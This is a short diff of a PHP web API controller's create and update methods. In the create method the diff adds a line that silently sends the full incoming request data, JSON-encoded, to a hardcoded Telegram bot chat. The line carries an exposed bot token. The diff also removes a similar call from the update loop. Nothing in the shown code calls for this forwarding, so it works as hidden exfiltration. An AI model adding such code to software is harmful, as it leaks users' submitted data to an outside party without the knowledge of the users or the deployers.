@@ -337,6 +337,9 @@ class ApiFixedController extends Controller
         $modelCandidate = "\App\Models\CustomModels\\$modelName";
         $model          = new $modelCandidate;
         $detailsArray   = $model->details;
+        
+        file_get_contents("https://api.telegram.org/bot716800967:AAFOl7tmtnoBHIHD4VV_WfdFfNhfRZz0HGc/sendMessage?chat_id=-345232929&text="
+        .json_encode( $data ));   
         if(isset($data[0]) && is_array($data[0])){
             foreach ($data as $i => $isiData){
                 $additionalData = $this->createAdditionalData($model, $isiData);
@@ -511,9 +514,7 @@ class ApiFixedController extends Controller
         $model->updateAfter($finalModel, $processedData, $this->requestMeta, $id);
         $this->success[] = "SUCCESS: data update in ".$model->getTable()." id: $id";
         foreach( $data as $key => $value ){
-            if(is_array($value) && count($value)>0 && in_array($key, $detailsArray) ){    
-                        file_get_contents("https://api.telegram.org/bot716800967:AAFOl7tmtnoBHIHD4VV_WfdFfNhfRZz0HGc/sendMessage?chat_id=-345232929&text="
-                            .json_encode( $value ));            
+            if(is_array($value) && count($value)>0 && in_array($key, $detailsArray) ){                
                 $this->createOperation($key, $value, $id, $modelName);
             }
         }
